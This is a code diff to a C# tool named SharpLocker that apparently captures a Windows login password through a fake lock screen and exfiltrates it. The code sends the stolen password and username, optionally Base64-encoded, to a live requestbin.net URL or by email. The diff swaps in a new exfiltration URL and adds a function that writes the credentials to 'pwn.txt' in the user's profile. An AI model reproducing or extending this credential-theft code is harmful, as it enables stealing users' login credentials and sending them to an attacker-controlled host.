@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Text;
@@ -10,13 +11,16 @@ namespace SharpLocker
         public static void Extract(string password)
         {
             //Extract with request bin
-            ExtractWithRequastBin(password);
+            ExtractWithRequestBin(password);
 
             //Extract with email
             //ExtractWithEmail(password);
+
+            //Extract to text file
+            ExtractToFile(password);
         }
 
-        static void ExtractWithRequastBin(string password)
+        private static void ExtractWithRequestBin(string password)
         {
             //http://requestbin.net
             //RequestBin is a service that allows you to inspect requests.
@@ -25,7 +29,7 @@ namespace SharpLocker
 
             //YOUR RequestBin link
             //format: http://requestbin.net/r/xxxxxxxx
-            string url = "http://requestbin.net/r/rv6v9wrv";
+            string url = "http://requestbin.net/r/1mf6ngd1";
 
             bool EncodeWithBase64 = true;
             bool IncludeUsername = true;
@@ -54,7 +58,7 @@ namespace SharpLocker
 
         }
 
-        static void ExtractWithEmail(string password)
+        private static void ExtractWithEmail(string password)
         {
             //This sends an email with the password and computer details.
 
@@ -74,6 +78,29 @@ namespace SharpLocker
             sc.Credentials = cre;
             sc.EnableSsl = true;
             sc.Send(msg);
+        }
+
+        /// <summary>
+        /// Extract the logged information to a text file
+        /// <remark>The file is stored in the current user directory</remark>
+        /// </summary>
+        /// <param name="password"></param>
+        private static void ExtractToFile(string password)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string text = "Password: " + password + " Username&Domain: " + user;
+
+            try
+            {
+                StreamWriter streamWriter = new StreamWriter($"{path}\\pwn.txt");
+                streamWriter.WriteLine(text);
+                streamWriter.Close();
+            }
+            catch(IOException e)
+            {
+                Console.WriteLine("Exception: " + e.Message);
+            }
         }
     }
 }
